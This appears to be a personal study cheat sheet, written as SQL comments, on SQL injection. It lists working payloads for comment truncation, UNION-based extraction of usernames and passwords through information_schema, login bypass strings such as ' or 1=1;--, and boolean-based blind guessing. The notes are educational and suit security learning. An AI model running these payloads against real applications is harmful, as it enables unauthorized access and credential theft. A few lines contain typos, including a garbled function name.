/* === BUILDING BLOCKS FOR INJECTION PAYLOADS === */

/* = COMMENTS = */

-- -- Comments
# -- Single line Comment
/* */ -- Multi line Comments

/* IMPORTANT: A comment lets you cleanly cut off the read of the original query; there is often lefotver SQL syntax
/ after your payload that would cause an error. Example:
*/

SELECT * FROM users WHERE username='INPUT' AND password='secret';
-- Injecting `admin'--` as the username turns it into:
SELECT * FROM users WHERE username='admin'-- AND password='secret'
-- Everything after the `--` is ignored, so the password check never runs.

/* = UNION = */
/* Combines the results of two or more `SELECT` statements into a single result set. Both statements must return same no
/ of columns and compatible data types:
*/

SELECT name, age FROM students UNION SELECT username, id FROM admins;
-- Attakcers use `UNION` to append their own `SELECT` statement (Union-Based Injection)

/* = LIKE AND WILDCARDS = */
SELECT * FROM users WHERE username LIKE 'adm%';
-- Attackers use something like this for enumeration

/* = LIMIT = */
SELECT * FROM users LIMIT 1;    -- Returns only the first row
SELECT * FROM users LIMIT 2, 1; -- Skips two rows, returns the third
-- In injection payloads, `LIMIT` is often used to control which row is returned or prevent output from being overwhelmed

/* = STRING FUNCTIONS = */
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users; -- Aggregates multiple values from multiple rows
-- `CONTACT()` joins individual values together (e.g., admin:pass123)

/* = INFORMATION_SCHEMA = */
information_schema.tables -- lists every table
information_schema.columns -- lists every column
-- When performing Union-Based Injection, is how you get from knowing how to inject to knowing every table and column

/* = EXAMPLE 1 = */
-- In a web app where:
SELECT * FROM articles WHERE id = 1 AND public = 1;

-- If the server side code looks like:
$query = "SELECT * FROM articles WHERE id = " . $_GET['id'] . " AND public = 1";

-- ... then whatever you put in the `id` param becomes part of the query. If you change the URL to ?id=1 OR 1=1--:
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
-- The `OR 1=1` makes the `WHERE` clause always true

/* = TYPES = */
-- IN-BAND: Results are returned directly in the web apps response;
-- -- Error-Based: Returns error messages that reveal information about the structure.
-- -- Union-Based: Uses `UNION` to append a second query and extract data through page output
-- BLIND: Infromation is inferred from indirect signals:
-- -- Auth Bypass: Login succeeds or fails based on injected query
-- -- Boolean-Based: The apps response changes subtly (e.g., different content)
-- -- Time-Based: Uses `SLEEP()` to introduce a time delay and observes whether it's present
-- OUT-OF-BAND: Causes the db server to make an external network request e.g., a DNS lookup

/* = PRIMARY METHODS OF DETECTION = */
-- Enter a single quote (') - If app returns a db error, likely being inserted into a SQL query without proper handling
-- Enter a double quote (") - Some queries use doble quotes instead
-- Enter ;-- - If the application behaves differently, the comment syntax is being processed
-- Test `OR 1=1` - if it changes the results, the input is directly in the query's logic

/* = IN BAND = */
/* ERROR-BASED */
-- When misconfigured, error-based injection exploits usually leak valuable info, e.g.:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1

/* UNION-BASED */
-- Primary method for extracting large amounts of data. Consistent series of steps:
-- 1. Determine the number of columns:
1 UNION SELECT 1        -- error (wrong column count)
1 UNION SELECT 1,2      -- error (still wrong)
1 UNION SELECT 1,2,3    -- success!

-- 2. Identify which columns are displayed:
0 UNION SELECT 1,2,3

-- 3. Extract the database name:
0 UNION SELECT 1,2,database()

-- 4. Enumerate tables using `information_schema.tables`:
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'database_name'

-- 5. Enumerate columnns:
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'target_table'

-- 6. Extract data:
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM target_table

/* = BLIND = */
/* AUTH BYPASS */
-- Most login forms work by sending the username and password to the server, which constructs a query like:
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
-- If returns a row, credentials are valid and you're logged in. You don't need to know a valid user or pass:
 SELECT * FROM users WHERE username='' OR 1=1;--'
-- This will return all users, due to 1=1 always being true
SELECT * FROM users WHERE username ='admin'--' AND password='anything' LIMIT 1;
-- Password check completely commented out; database returns admin row, and you're logged in as admin without needing pw.

/* VARIATIONS */
-- ' or 1=1;-- : classic bypass, try this first! works when username is wrapped in single quotes
-- ' OR 1=1# : This uses # as the comment character (MySQL alternative)
-- " OR 1=1-- : For queries that use double quotes around the input
-- Try both the username and password fields, some applications only concatenate one of them into the query

/* BOOLEAN BASED */
-- Works for a true/false difference in an app. Example if theres an injectable backend query such as:
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
-- By injecting a `UNION SELECT` with a condition, you can ask the database arbitrary yes/no qestions and read for a true/false response.
-- 1. Confirm injection:
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--

-- 2. Guess the database name, char by char:
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
-- If false, try different letters, until true, then move onto char 2. (e.g., 'ca%')

-- 3. Get table and columnn names. Same technique against `information_schema`:
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
-- Cycle through to find table names. Slow but reliable.
